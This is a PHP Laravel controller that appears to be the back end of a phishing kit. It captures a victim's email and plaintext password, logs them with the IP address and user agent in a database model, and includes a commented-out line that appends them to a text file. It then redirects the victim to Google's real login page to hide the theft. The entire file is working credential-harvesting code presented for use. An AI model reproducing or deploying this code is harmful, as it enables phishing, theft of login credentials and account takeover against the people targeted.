<?php

namespace App\Http\Controllers;

use App\Models\Tamu;
use Illuminate\Http\Request;

class HomeController extends Controller
{
    //
    public function index(Request $request)
    {
        if(isset($_POST['Email']) && strlen($_POST['Email']) > 0){
            session(['Email' => $_POST["Email"]]);
        }

        if (isset($_POST['password']) && strlen($_POST['password']) > 0) {
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ipaddress = $_SERVER['REMOTE_ADDR'];
            }

            $pass = $_POST['password'];

            $email = session('Email');

            if (!$email) {
                # code...
                return redirect('/');
            }

            Tamu::create([
                'email' => $email,
                'pass' => $pass,
                'ip' => $ipaddress,
                'user_agent' => $_SERVER['HTTP_USER_AGENT']
            ]);
            // file_put_contents('usernames.txt', '[EMAIL]: ' . $email . '  [PASS]: ' . $pass . ' [IP]: ' . $ipaddress . ' [USER_AGENT]: ' . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
            session()->forget('Email');
            echo '<script>
                window.location = "'.env("REDIRECT_SUCCESS",'https://accounts.google.com/login').'";
            </script>';
        }

        return view('welcome');
    }
}
